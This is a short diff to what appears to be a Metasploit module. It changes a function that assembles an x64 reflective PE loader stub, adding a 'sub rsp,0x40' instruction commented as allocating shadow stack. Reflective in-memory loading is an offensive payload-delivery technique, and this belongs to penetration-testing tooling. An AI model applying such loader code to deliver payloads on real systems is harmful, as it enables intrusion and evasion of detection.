@@ -52,7 +52,7 @@ module MetasploitModule
 
   def encapsulate_reflective_stub(mapped_pe, opts)
     call_size = mapped_pe.length + 5
-    reflective_loader = Metasm::Shellcode.assemble(Metasm::X64.new, "cld\ncall $+#{call_size}").encode_string
+    reflective_loader = Metasm::Shellcode.assemble(Metasm::X64.new, "sub rsp,0x40\ncld\ncall $+#{call_size}").encode_string # Allocate shadow stack
     reflective_loader += mapped_pe
     reflective_loader + Metasm::Shellcode.assemble(Metasm::X64.new, asm_reflective_pe_loader_x64(opts)).encode_string
   end
